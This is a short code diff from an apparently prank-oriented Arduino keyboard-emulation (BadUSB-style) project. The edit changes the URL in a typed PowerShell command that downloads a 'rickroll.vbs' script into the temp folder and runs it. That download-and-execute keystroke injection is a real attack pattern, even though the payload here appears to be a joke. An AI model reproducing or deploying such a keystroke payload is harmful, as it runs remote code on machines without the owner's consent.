@@ -28,7 +28,7 @@ void runPayload() {
 	delay(100);
 
 	// Download and run rickroll.vbs and exit when done
-	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://pixelcoding.nl/download/rickroll.vbs','%TEMP%\\rickroll.vbs'); && start %TEMP%\\rickroll.vbs && exit");
+	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%TEMP%\\rickroll.vbs'); && start %TEMP%\\rickroll.vbs && exit");
 	delay(100);
 	typeKey(KEY_RETURN);
 
